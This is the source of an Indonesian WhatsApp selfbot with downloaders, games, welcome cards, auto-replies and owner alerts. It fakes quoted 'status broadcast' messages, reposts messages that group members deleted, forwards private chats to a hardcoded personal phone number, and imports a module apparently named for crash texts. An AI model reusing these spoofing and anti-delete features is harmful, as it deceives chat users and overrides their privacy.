
/*Yanz Selbot WhatsApp*/

const {
  WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  GroupSettingChange,
  ChatModification,
  waChatKey,
  WA_DEFAULT_EPHEMERAL,
  mentionedJid,
  processTime
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const FormData = require('form-data')
const imageToBase64 = require('image-to-base64')
const speed = require('performance-now')
const clc = require('chalk')
const fs = require("fs")
const os = require("os")
const imgbb = require('imgbb-uploader')
const ffmpeg = require('fluent-ffmpeg')
const axios = require('axios')
const brainly = require('brainly-scraper')
const request = require('request')
const { exec } = require('child_process')
const { color, bgcolor } = require('./lib/color')
const { help } = require('./lib/help')
const { list } = require('./lib/listsurah')
const { bahasa } = require('./src/bahasa')
const { virtex } = require('./src/virtex')
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const tmp_hit = JSON.parse(fs.readFileSync('./src/tmp_hit.json'))
const welkom = JSON.parse(fs.readFileSync('./src/group/welkom.json'))
const promdem = JSON.parse(fs.readFileSync('./src/group/promdem.json'))
const antilink = JSON.parse(fs.readFileSync('./src/group/antilink.json'))
const antidelete = JSON.parse(fs.readFileSync('./src/group/antidelete.json'))
const base64Img = require('base64-img')
const fetch = require('node-fetch')
const afk = JSON.parse(fs.readFileSync('./src/group/afk.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./src/group/tebakgambar.json'))
const kuis = JSON.parse(fs.readFileSync('./src/group/kuiss.json'))

const conn = require("./lib/connect")
const msg = require("./lib/message")
const wa = require("./lib/wa")
const config = JSON.parse(fs.readFileSync("./config.json"))
const owner = config.owner
const mods = config.mods

conn.connect()
const riyan = conn.riyan

const option = JSON.parse(fs.readFileSync('./src/option.json'))
const {
    Lolkey,
    Nopalkey,
    Zekskey,
    Lindowkey,
    Xteamkey,
    Igbkey
} = option
                   lol = `${Lolkey}`
                   nopal = `${Nopalkey}`
                   apiZeks = `${Zekskey}`
                   apilin = `${Lindowkey}`
                   apixt = `${Xteamkey}`
                   apgb = `${Igbkey}`

const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + 'FN:Yannz\n'
            + 'ORG:Owner SELF BOT;\n'
            + 'TEL;type=CELL;type=VOICE;waid=6285791458996:+62 857-9145-8996\n'
            + 'END:VCARD'

cr = 'Simple Selfbot'
fakethumb = fs.readFileSync('./strg/image/ranime2.jpeg')
prefix = '.'
tmphit = []
blocked = []
battre = 10
charging = false
respon_pm = false
response = {}
simi = false
public = false

 function kyun(seconds){
   function pad(s){
    return (s < 10 ? '0' : '') + s;
    }
        var hours = Math.floor(seconds / (60*60));
        var minutes = Math.floor(seconds % (60*60) / 60);
        var seconds = Math.floor(seconds % 60);
        //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
        return `${pad(hours)}Hours, ${pad(minutes)}Min, ${pad(seconds)}Sec`
}

   riyan.on('CB:action,,battery', json => {
   const batteryLevelStr = json[2][0][1].value
   const batterylevel = parseInt(batteryLevelStr)
   if (json[2][0][1].live == 'true') charging = true
   if (json[2][0][1].live == 'false') charging = false
   battre = batterylevel
   })

    riyan.on('CB:action,,call', async json => {
    const penelpon = json[2][0][1].from;
    riyan.updatePresence(penelpon, Presence.composing)
    console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mWARNING\x1b[1;37m]', color(`${penelpon} Is Calling You!`))
    riyan.sendMessage(penelpon, 'Maaf, bot tidak bisa menerima panggilan. Bot otomatis memblokir apabila menerima panggilan', MessageType.extendedText)
    setTimeout( () => {
    riyan.blockUser(penelpon, "add")
    }, 2000)
    })

    riyan.on('CB:Blocklist', json => {
  if (blocked.length > 2) return
     for (let i of json[1].blocklist) {
    blocked.push(i.replace('c.us','s.whatsapp.net'))
        }
        })

function monospace(string) {
return '```' + string + '```'

}
global.config = {
    unvoke: true,
    unvokeMe: false
}
    if (!Array.isArray(riyan._events['CB:action,add:relay,message'])) riyan._events['CB:action,add:relay,message'] = [riyan._events['CB:action,add:relay,message']]
  else riyan._events['CB:action,add:relay,message'] = [riyan._events['CB:action,add:relay,message'].pop()]
   riyan._events['CB:action,add:relay,message'].unshift(async json => {
    try {
        if (!global.config.unvoke) return
        let m = json[2][0][2]
        if (m.message && m.message.protocolMessage && m.message.protocolMessage.type == 0) {
            let key = m.message.protocolMessage.key
            var from = key.remoteJid
            var isGroup = from.endsWith('@g.us')
            const isAntiDelete = isGroup ? antidelete.includes(from) : false
            if (!isAntiDelete) return
            if (key.fromMe && !global.config.unvokeMe) return
            let c = riyan.chats.get(key.remoteJid)
            let a = c.messages.dict[`${key.id}|${key.fromMe ? 1 : 0}`]
            let participant = key.fromMe ? riyan.user.jid : a.participant ? a.participant : key.remoteJid
            riyan.sendMessage(key.remoteJid, monospace(`[ BOT ] Terdeteksi @${(participant).replace(/@.+/, '')} telah menghapus pesan:v`), MessageType.extendedText, {
                contextInfo: {
                    mentionedJid: [participant],
                    quotedMessage: a.message
                }
            })

            let content = riyan.generateForwardMessageContent(a, false)

            let ctype = Object.keys(content)[0]
            let atype = Object.keys(a.message)[0]
            let context = {}
            if (atype != MessageType.text) context = a.message[atype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = riyan.prepareMessageFromContent(key.remoteJid, content, {})
            await riyan.relayWAMessage(waMessage)
        }
    } catch (e) {
        console.log(e)
    }
})

/*riyan.on('group-participants-update', async (anu) => {
                if (!welkom.includes(anu.jid)) return
                try {
                const mdata = await riyan.groupMetadata(anu.jid)
                console.log(anu)
                if (anu.action == 'add') {
                    num = anu.participants[0]
                try {
                    ppimg = await riyan.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
                    } catch {
                    ppimg = 'https://i.ibb.co/t4hSDK6/d7358cecf86b.png'
                    }
                    teks = `Hallo @${num.split('@')[0]} Welcome to Group *${mdata.subject}* Semoga betah`
                    buff = await getBuffer(ppimg)
                    riyan.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, thumbnail: buff, contextInfo: {"mentionedJid": [num]}})
                 } else if (anu.action == 'remove') {
                    num = anu.participants[0]
                 try {
                    ppimg = await riyan.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
                    } catch {
                    ppimg = 'https://i.ibb.co/t4hSDK6/d7358cecf86b.png'
                    }
                    teks = `Byee @${num.split('@')[0]} 👋`
                    let buff = await getBuffer(ppimg)
                    riyan.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, thumbnail: buff, contextInfo: {"mentionedJid": [num]}})
                    }} catch (e) {
                    console.log('Error : %s', color(e, 'red'))
                    }
                    })*/

riyan.on('group-participants-update', async (anu) => {
                if (!welkom.includes(anu.jid)) return
                try {
                const mdata = await riyan.groupMetadata(anu.jid)
                console.log(anu)
                if (anu.action == 'add') {
                    num = anu.participants[0]
                try {
                    ppimg = await riyan.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
                    } catch {
                    ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                try {
                    ppgc = await riyan.getProfilePicture(mdata.id)
                    } catch {
                    ppgc = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                    teks = `Hallo @${num.split('@')[0]} Welcome to Group *${mdata.subject}* Semoga betah`
                    conts = riyan.contacts[num] || { notify: jid.replace(/@.+/, '') }
                    pushname = conts.notify || conts.vname || conts.name || '-'
                    memeg = mdata.participants.length
                    let buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/welcome2?nama=${encodeURI(pushname)}&descriminator=${tmp_hit.length}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&gcicon=${ppgc}&pp=${ppimg}&bg=https://i.ibb.co/nzMF2cn/852bbc814abc.jpg`)
                    riyan.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, thumbnail: buff, contextInfo: {"mentionedJid": [num]}})
                 } else if (anu.action == 'remove') {
                    num = anu.participants[0]
                 try {
                    ppimg = await riyan.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
                    } catch {
                    ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                 try {
                    ppgc = await riyan.getProfilePicture(mdata.id)
                    } catch {
                    ppgc = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                    teks = `Byee @${num.split('@')[0]} 👋`
                    conts = riyan.contacts[num] || { notify: jid.replace(/@.+/, '') }
                    pushname = conts.notify || conts.vname || conts.name || '-'
                    memeg = mdata.participants.length
                    let buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/goodbye2?nama=${encodeURI(pushname)}&descriminator=${tmp_hit.length}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&gcicon=${ppgc}&pp=${ppimg}&bg=https://i.ibb.co/nzMF2cn/852bbc814abc.jpg`)
                    riyan.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, thumbnail: buff, contextInfo: {"mentionedJid": [num]}})
                    }} catch (e) {
                    console.log('Error : %s', color(e, 'red'))
                    }
                    })

riyan.on('group-participants-update', async (asu) => {
        if (!promdem.includes(asu.jid)) return
            try {
            mdata = await riyan.groupMetadata(asu.jid)
            console.log(asu)
            if (asu.action == 'promote') {
             try {
              ppimg = await riyan.getProfilePicture(`${asu.participants[0].split('@')[0]}@c.us`)
              } catch {
              ppimg = 'https://i.ibb.co/t4hSDK6/d7358cecf86b.png'
              }
              num = asu.participants[0]
              teks = `*❏ PROMOTE - DETECTED*\n\nUsername : @${num.split('@')[0]}\nTelah menjadi Admin di Group\n*${mdata.subject}*\n\nSudah jadi admin jangan seenaknya ya tod:v`
              let buff = await getBuffer(ppimg)
              riyan.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, thumbnail: buff, contextInfo: {"mentionedJid": [num]}})
              } else if (asu.action == 'demote') {
             try {
              ppimg2 = await riyan.getProfilePicture(`${asu.participants[0].split('@')[0]}@c.us`)
              } catch {
              ppimg2 = 'https://i.ibb.co/t4hSDK6/d7358cecf86b.png'
              }
              num = asu.participants[0]
              teks = `*❏ DEMOTE - DETECTED*\n\nUsername : @${num.split('@')[0]}\nTelah di Demote di Group \n*${mdata.subject}*\n\nAwokawok di demote:v`
              let buff = await getBuffer(ppimg2)
              riyan.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, thumbnail: buff, contextInfo: {"mentionedJid": [num]}})
              }
              } catch (e) {
              console.log('Error : %s', color(e, 'red'))
                 }
              })

riyan.on('chat-update', async(yan) => {
    try {
        if (!yan.hasNewMessage) return
        if (!yan.messages) return
        if (yan.key && yan.key.remoteJid == 'status@broadcast') return
        yan = yan.messages.all()[0]
        if (!yan.message) return
        const from = yan.key.remoteJid
        const type = Object.keys(yan.message)[0]
        const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
        const quoted = type == 'extendedTextMessage' && yan.message.extendedTextMessage.contextInfo != null ? yan.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const typeQuoted = Object.keys(quoted)[0]
        const body = yan.message.conversation || yan.message[type].caption || yan.message[type].text || ""
        chats = (type === 'conversation') ? yan.message.conversation : (type === 'extendedTextMessage') ? yan.message.extendedTextMessage.text : ''
        budy = (type === 'conversation' && yan.message.conversation.startsWith(prefix)) ? yan.message.conversation : (type == 'imageMessage') && yan.message.imageMessage.caption.startsWith(prefix) ? yan.message.imageMessage.caption : (type == 'videoMessage') && yan.message.videoMessage.caption.startsWith(prefix) ? yan.message.videoMessage.caption : (type == 'extendedTextMessage') && yan.message.extendedTextMessage.text.startsWith(prefix) ? yan.message.extendedTextMessage.text : ''
        const time2 = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
        const unread2 = await riyan.loadAllUnreadMessages()

        if (prefix != "") {
            if (!body.startsWith(prefix)) {
                cmd = false
                comm = ""
            } else {
                cmd = true
                comm = body.slice(1).trim().split(" ").shift().toLowerCase()
            }
        } else {
            cmd = false
            comm = body.trim().split(" ").shift().toLowerCase()
        }

        const reply = async(teks) => {
            await riyan.sendMessage(from, teks, MessageType.text, { quoted: yan })
        }

        const command = comm
        const yanz = body.trim().split(/ +/).slice(1)
        const q = yanz.join(" ")
        const isCmd = cmd
        const meNumber = riyan.user.jid
        const botNumber = riyan.user.jid.split("@")[0]
        const isGroup = from.endsWith('@g.us')
        const arg = chats.slice(command.length + 2, chats.length)
        const sender = yan.key.fromMe ? riyan.user.jid : isGroup ? yan.participant : yan.key.remoteJid
        const senderNumber = sender.split("@")[0]
        const groupMetadata = isGroup ? await riyan.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? await wa.getGroupAdmins(groupMembers) : []
        const isAdmin = groupAdmins.includes(sender) || false
        const isBotGroupAdmins = groupAdmins.includes(meNumber) ? 'Iya' : 'Tidak'
        const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
        const groupId = isGroup ? groupMetadata.jid : ''
        const groupDesc = isGroup ? groupMetadata.desc : ''
        const groupOwner = isGroup ? groupMetadata.owner : ''
        const groupDescOwner = isGroup ? groupMetadata.descOwner : ''
        const groupSubOwner = isGroup ? groupMetadata.subjectOwner : ''
        const timestp = isGroup ? groupMetadata.creation : ''
        const groupCreate = moment(timestp * 1000).format('dddd, DD MMMM YYYY')
        const pukul = moment(timestp * 1000).format('HH:mm:ss')
        const timestp2 = isGroup ? groupMetadata.descTime : ''
        const groupDTime = moment(timestp2 * 1000).format('dddd, DD MMMM YYYY')
        const pukul2 = moment(timestp2 * 1000).format('HH:mm:ss')
        const timestp3 = isGroup ? groupMetadata.subjectTime : ''
        const groupSTime = moment(timestp3 * 1000).format('dddd, DD MMMM YYYY')
        const pukul3 = moment(timestp3 * 1000).format('HH:mm:ss')
        const totalchat = riyan.chats.all()
        const totalgroup = riyan.chats.array.filter(v => v.jid.endsWith('g.us')).map(v => v.jid)
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const isWelkom = isGroup ? welkom.includes(from) : false
        const isPromdem = isGroup ? promdem.includes(from) : false
        const isAntiDelete = isGroup ? antidelete.includes(from) : false
        const isKuis = isGroup ? kuis.includes(from) : false
        var pes = (type === 'conversation' && yan.message.conversation) ? yan.message.conversation : (type == 'imageMessage') && yan.message.imageMessage.caption ? yan.message.imageMessage.caption : (type == 'videoMessage') && yan.message.videoMessage.caption ? yan.message.videoMessage.caption : (type == 'extendedTextMessage') && yan.message.extendedTextMessage.text ? yan.message.extendedTextMessage.text : ''
        const message = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
        const itsMe = senderNumber == botNumber
        const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
        const isBot = botNumber.includes(sender)
        pushname2 = riyan.contacts[sender] != undefined ? riyan.contacts[sender].vname || riyan.contacts[sender].notify : undefined

        mess = {
          wait: 'Loading...',
          success: ' ️success ',
            error: {
               stick: 'error',
               Iv: 'Link ga valid'
                 },
            only: {
                group: 'only for groups',
                ownerG: 'only for owner group',
                ownerB: 'only for owner bot',
                admin: 'lu kan bukan admin gc',
                Badmin: 'jadikan lu admin dlu'
            }
        }

        const mentionByTag = type == "extendedTextMessage" && yan.message.extendedTextMessage.contextInfo != null ? yan.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && yan.message.extendedTextMessage.contextInfo != null ? yan.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        const mentions = (teks, memberr, id) => {
        (id == null || id == undefined || id == false) ? riyan.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : riyan.sendMessage(from, teks.trim(), extendedText, {quoted: yan, contextInfo: {"mentionedJid": memberr}})
        }
        const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }

        freply = {
        key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`, ...(from ? {
        remoteJid: "status@broadcast"
        }: {})
        }, message: {
        imageMessage: {
        caption: '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕',
        jpegThumbnail: fs.readFileSync('./strg/image/ranime2.jpeg')}
        }
        }

        fmen = {
        key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`, ...(from ? {
        remoteJid: "status@broadcast"
        }: {})
        }, message: {
        imageMessage: {
        caption: '𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐖𝐢𝐭𝐡 ♥ 𝐁𝐲 𝐑𝐢𝐲𝐚𝐧',
        jpegThumbnail: fs.readFileSync('./strg/image/ranime2.jpeg')}
        }}

        // Ucapan Waktu
        const hour_now = moment().format('HH')
        var ucapanWaktu = 'Selamat Pagi Riyan >//<'
        if (hour_now >= '03' && hour_now <= '10') {
          ucapanWaktu = 'Selamat Pagi Riyan >//<'
        } else if (hour_now >= '10' && hour_now <= '14') {
          ucapanWaktu = 'Selamat Siang Riyan >//<'
        } else if (hour_now >= '14' && hour_now <= '16') {
          ucapanWaktu = 'Selamat Sore Riyan >//<'
        } else if (hour_now >= '16' && hour_now <= '17') {
          ucapanWaktu = 'Selamat Petang Riyan >//<'
        } else if (hour_now >= '17' && hour_now <= '23') {
          ucapanWaktu = 'Selamat Malam Riyan >//<'
        } else {
          ucapanWaktu = 'Selamat Malam Riyab >//<'
        }

        //Tanggal
        s = `'`
        myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
        myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',`Jum${s}at`,'Sabtu'];
        var tgl = new Date();
        var day = tgl.getDate()
        var bulan = tgl.getMonth()
        var thisDay = tgl.getDay(),
        thisDay = myDays[thisDay];
        var yy = tgl.getYear()
        var year = (yy < 1000) ? yy + 1900 : yy;
        const tanggal = `${thisDay}, ${day} ${myMonths[bulan]} ${year}`

        async function fakestatus(pesan, faketeks, tipe, buffer) {
        const ini_fakestatus = {
         contextInfo: {mentionedJid: [sender]},
            quoted: {
                 key: {
                   fromMe: false,
                    participant: `0@s.whatsapp.net`, ...(from ? {
                    remoteJid: "status@broadcast"
                    }: {})
                    }, message: {
                    imageMessage: {
                    caption: faketeks,
                    jpegThumbnail: buffer}
                    }
                   }
                }
        riyan.sendMessage(from, pesan, tipe, ini_fakestatus)
        }

        async function fakestatus2(pesan, faketeks, tipe, buffer, tag) {
        const ini_fakestatus = {
         contextInfo: {mentionedJid: [tag]},
            quoted: {
                 key: {
                  fromMe: false,
                    participant: `0@s.whatsapp.net`, ...(from ? {
                    remoteJid: "status@broadcast"
                    }: {})
                    }, message: {
                    imageMessage: {
                    caption: faketeks,
                    jpegThumbnail: buffer}
                    }
                   }
                }
        riyan.sendMessage(from, pesan, tipe, ini_fakestatus)
        }

        const sleep = async (ms) => {
        return new Promise(resolve => setTimeout(resolve, ms));
        }

        const pickRandom = async (ext) => {
        akuu = Math.floor(Math.random() * `${ext}`.length)
        return `${ext}`[akuu]
        }

        const isImage = type == 'imageMessage'
        const isVideo = type == 'videoMessage'
        const isAudio = type == 'audioMessage'
        const isSticker = type == 'stickerMessage'
        const isContact = type == 'contactMessage'
        const isLocation = type == 'locationMessage'
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')

        typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = "Image"
        else if (isVideo) typeMessage = "Video"
        else if (isAudio) typeMessage = "Audio"
        else if (isSticker) typeMessage = "Sticker"
        else if (isContact) typeMessage = "Contact"
        else if (isLocation) typeMessage = "Location"

        const isQuoted = type == 'extendedTextMessage'
        const isQuotedImage = isQuoted && typeQuoted == 'imageMessage'
        const isQuotedVideo = isQuoted && typeQuoted == 'videoMessage'
        const isQuotedAudio = isQuoted && typeQuoted == 'audioMessage'
        const isQuotedSticker = isQuoted && typeQuoted == 'stickerMessage'
        const isQuotedContact = isQuoted && typeQuoted == 'contactMessage'
        const isQuotedLocation = isQuoted && typeQuoted == 'locationMessage'
        const isQuotedText = isQuoted

            if (!isGroup && isOwner && simi) {
            if (yan.key.fromMe === false && ! from.includes("status@broadcast")) {
            try {
            console.log('> [YANNZ] FITUR SIMI !!')
            await riyan.updatePresence(from, Presence.composing)
            riyan.chatRead(from)
            simi = await fetchJson(`https://lindow-api.herokuapp.com/api/simi?text=${chats}&lang=id&apikey=${apilin}`)
            reply(simi.response.text)
            } catch (e) {
            reply(`.......`)
            }}}

            // Sibuk Ngen
            if (!isGroup && respon_pm) {
            if (isOwner) return
            if (!response[sender]) {
            response[sender] = true
            if (yan.key.fromMe === false && ! from.includes("status@broadcast")) {
            riyan.chatRead(from)
            await riyan.updatePresence(from, Presence.composing)
            teks = `Hai @${sender.split("@")[0]} 👋, ${ucapanWaktu}

Saya mungkin lagi ada kesibukan.
mohon tinggalkan pesan disini dan saya akan segera kembali online!.
-
I may be busy again.
please leave a message here and I'll be back online soon!`
            riyan.sendMessage(from, teks, text, {sendEphemeral: true, quoted: freply, contextInfo: {mentionedJid: [sender]}})
            teks2 = `Om Ada Yg Chat Tuh, Dari @${sender.split("@")[0]}\n\nPesan nya : ${chats}`
            riyan.sendMessage("6285791458996@s.whatsapp.net", teks2, text, {quoted: freply, contextInfo: {mentionedJid: [sender]}})
            }
            console.log(clc.yellow('Om Ada Yang Chat Tuh!'))
            }}

            if (!itsMe) {
            // Tiktok Downloader
            if (message.includes("#tiktok")) {
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('#tiktok'), 'from', color(sender.split("@")[0]), 'yanz :', color(yanz.length))
            if (yanz.length < 1) return reply('Urlnya mana?')
            fakestatus(`*Wait...*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
            url = yanz[0]
            anu = await fetchJson(`https://api.xteam.xyz/dl/tiktok?url=${url}&APIKEY=${apixt}`)
            result = anu.info
            buf = await getBuffer(`${anu.server_1}`)
            teks = ` _*Tiktok Downloader*_\n
*Username :* ${result[0].authorMeta.name}
*Nickname :* ${result[0].authorMeta.nickName}\n
*Ratio :* ${result[0].videoMeta.ratio}
*Durasi :* ${result[0].videoMeta.duration} _detik_
*Music :* ${result[0].musicMeta.musicName}
*Caption :* ${result[0].text}`
            riyan.sendMessage(from, buf, video, {quoted: yan, caption: teks})
            }
            // Video To Mp3
            if (message.includes("#tomp3")) {
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('#tomp3'), 'from', color(sender.split("@")[0]), 'yanz :', color(yanz.length))
            fakestatus(`*Wait...*`, '𝒀𝒂𝒏𝒛 𝑺𝒆𝒍𝒇𝒃𝒐𝒕', text, fakethumb)
            encmedia = JSON.parse(JSON.stringify(yan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
            media = await riyan.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
            buffer = fs.readFileSync(ran)
            riyan.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: yan})
            fs.unlinkSync(ran)
            })
            }
            // Road To Idul Fitri
            if (message.includes("lebaran")) {
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('𝙈𝙀𝙉𝙐𝙅𝙐 𝙄𝘿𝙐𝙇 𝙁𝙄𝙏𝙍𝙄'), 'from', color(sender.split("@")[0]), 'yanz :', color(yanz.length))
            var countDownDate2 = new Date("05 13 2021 00:00:00").getTime();
            var now2 = new Date().getTime();
            var distance2 = countDownDate2 - now2;
            var days2 = Math.floor(distance2 / (1000 * 60 * 60 * 24));
            var hours2 = Math.floor((distance2 % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            var minutes2 = Math.floor((distance2 % (1000 * 60 * 60)) / (1000 * 60));
            var seconds2 = Math.floor((distance2 % (1000 * 60)) / 1000);
            send = `${sender.split("@")[0]}@s.whatsapp.net`
            teks = `Hallo Kak @${sender.split("@")[0]}\n\n*Hitung Mundur Hari Raya Idul Fitri :*\n${days2} Hari ${hours2} Jam ${minutes2} Menit ${seconds2} Detik\n\nSemoga Pada Saat Ramadhan, Ibadah Puasa Kita Di Terima Oleh Allah SWT. Amin`
            thumbnail = fs.readFileSync('./strg/image/ramadhan.jpeg')
            fakestatus(teks, '𝙈𝙀𝙉𝙐𝙅𝙐 𝙄𝘿𝙐𝙇 𝙁𝙄𝙏𝙍𝙄 𝟮𝟬𝟮𝟭', text, thumbnail)
            }
            // Kang Tag
            if (message.includes(`@${botNumber}`) && isGroup) {
            buff = fs.readFileSync('./strg/stiker/tag.webp')
            riyan.sendMessage(from, buff, sticker, {quoted: yan, sendEphemeral: true})
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('tagged'), 'from', color(groupName), 'yanz :', color(yanz.length))
            }
            // Menjawab Salam
            if (message.includes("assalamualaikum")) {
            reply('Waalaikumusalam Warahmatullahi Wabarakatuh')
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('Assalamualaikum'), 'from', color(sender.split('@')[0]), 'yanz :', color(yanz.length))
            }
            // Menjawab Salam
            if (message.includes("assalamu'alaikum")) {
            reply ('Waalaikumusalam Warahmatullahi Wabarakatuh')
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('Assalamualaikum'), 'from', color(sender.split('@')[0]), 'yanz :', color(yanz.length))
            }
            // Group Link
            if (budy.includes("grouplink")) {
            if (!isGroup) return reply(`Maaf kak *${pushname}* fitur ini hanya bisa di pakai didalam group!`)
            if (!isBotGroupAdmins) return reply('Jadikan bot Admin terlebih dahulu!')
            lk = `_*${groupName}*_`
            linkgc2 = await riyan.groupInviteCode(from)
            teks = `https://chat.whatsapp.com/${linkgc2}\n\nlink Group *${groupName}*`
            reply(teks)
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('grouplink'), 'from', color(sender.split('@')[0]), 'yanz :', color(yanz.length))
            }
            // Jadian
            if (budy.includes("jadian") && isKuis) {
            members_id = []
            for (let mem of groupMembers) {
            akuu = Math.floor(Math.random() * members_id.length)
            diaa = Math.floor(Math.random() * members_id.length)
            members_id.push(mem.jid)
            }
            Ak = members_id[akuu]
            Di = members_id[diaa]
            teks = `Cie... @${members_id[akuu].split("@")[0]} (💘) @${members_id[diaa].split("@")[0]} baru jadian nih\nBagi pj nya dong`
            riyan.sendMessage(from, teks, text, {quoted: yan, contextInfo: {"mentionedJid": [Ak, Di]}})
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('jadian'), 'from', color(sender.split('@')[0]), 'yanz :', color(yanz.length))
            }
            // Suit
            if (budy.includes("suit") && isKuis) {
            const player = yanz.join(" ")
            const botc = ['batu','kertas','gunting']
            if ( yanz.length < 1 ) return reply('Pilih apa gan?\nbatu, kertas, gunting')
            bot = botc[Math.floor(Math.random() * botc.length)]
            var resu = ''
            if ( player == bot ) {
            resu = '*Seri*'
            } else if( player == 'kertas' ) {
            resu = ( bot == 'batu' ) ? 'Kamu Menang!' : 'Kamu Kalah!'
            } else if( player == 'batu' ) {
            resu = ( bot == 'kertas' ) ? 'Kamu Kalah!' : 'Kamu Menang!'
            } else if( player == 'gunting' ) {
            resu = ( bot == 'batu' ) ? 'Kamu Kalah!' : 'Kamu Menang!'
            } else {
            resu = `Ngajak berantem @${sender.split("@")[0]}?`
            }
            if (resu == "Itu apaan") reply('Maaf kamu diskualifikasi dari permainan karna bukan gunting, batu ato kertas')
            teks = '*_Hasil Pertandingan_*\n\n*Kamu Memilih :* ' + player + '\n*Bot Memilih :* ' + bot + '\n\n*Hasil =* ' + resu + ''
            riyan.sendMessage(from, teks, text, {quoted: yan, contextInfo:{mentionedJid: [sender]}})
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mYANNZ\x1b[1;37m]', time2, color('suit'), 'from', color(sender.split('@')[0]), 'yanz :', color(yanz.length))
            }
            // Tebak Gambar
            if (tebakgambar.hasOwnProperty(sender.split("@")[0]) && isKuis) { //
                jawaban = tebakgambar[sender.split("@")[0]]
                if (chats.toLowerCase() == jawaban) {
                    reply("Jawaban Anda Benar!\n\nNote : untuk memulai permainan lagi, mohon beri jeda 30 detik, setelah itu lanjut main lagi")
